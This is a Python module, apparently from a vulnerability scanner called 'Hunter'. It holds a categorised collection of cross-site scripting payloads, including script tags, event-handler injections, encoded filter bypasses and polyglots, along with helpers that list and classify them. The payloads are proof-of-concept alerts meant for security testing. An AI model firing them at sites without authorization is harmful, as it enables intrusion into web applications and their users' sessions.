"""XSS Payloads for Hunter"""

from typing import Dict, List


# XSS payloads organized by category
XSS_PAYLOADS: Dict[str, List[str]] = {
    "basic": [
        "<script>alert(1)</script>",
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert(1)>",
        "<svg onload=alert('XSS')>",
    ],
    "img": [
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert('XSS')>",
        "<img src=javascript:alert(1)>",
        "<img src=javascript:alert('XSS')>",
    ],
    "svg": [
        "<svg onload=alert(1)>",
        "<svg onload=alert('XSS')>",
        "<svg/onload=alert(1)>",
        "<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    ],
    "javascript": [
        "javascript:alert(1)",
        "javascript:alert('XSS')",
        "javascript://%0aalert(1)",
        "javascript://%0dalert(1)",
    ],
    "event_handlers": [
        "\" onmouseover=alert(1) \"",
        "' onmouseover=alert(1) '",
        " onfocus=alert(1) autofocus ",
        " onerror=alert(1) ",
        " onload=alert(1) ",
    ],
    "html_injection": [
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<details open ontoggle=alert(1)>",
        "<marquee onstart=alert(1)>",
    ],
    "encoded": [
        "&lt;script&gt;alert(1)&lt;/script&gt;",  # HTML entities
        "%3Cscript%3Ealert(1)%3C/script%3E",  # URL encoded
        "<scr ipt>alert(1)</scr ipt>",  # Space bypass
        "<script >alert(1)</script >",  # Space bypass
    ],
    "polyglots": [
        "'\"><svg/onload=alert(1)>",
        "'\"><img src=x onerror=alert(1)>",
        "javascript://--></script></title></style>\"/'`--></svg></textarea><img src=x onerror=alert(1)//>",
    ]
}


def get_payloads(category: str) -> List[str]:
    """Get payloads for a specific category"""
    return XSS_PAYLOADS.get(category, [])


def get_all_payloads() -> List[str]:
    """Get all payloads flattened"""
    all_payloads = []
    for category_payloads in XSS_PAYLOADS.values():
        all_payloads.extend(category_payloads)
    return list(dict.fromkeys(all_payloads))


def is_event_handler_payload(payload: str) -> bool:
    """Check if payload uses event handlers"""
    event_handlers = ['onerror', 'onload', 'onmouseover', 'onfocus', 'onclick', 
                      'onstart', 'ontoggle', 'onchange']
    payload_lower = payload.lower()
    return any(eh in payload_lower for eh in event_handlers)


def get_context_for_payload(payload: str) -> str:
    """Determine the XSS context for a payload"""
    if '<script>' in payload.lower():
        return 'script'
    elif '<img' in payload.lower() or '<svg' in payload.lower():
        return 'html'
    elif 'javascript:' in payload.lower():
        return 'url'
    elif 'on' in payload.lower() and any(eh in payload.lower() for eh in ['onerror', 'onload']):
        return 'attribute'
    else:
        return 'html'
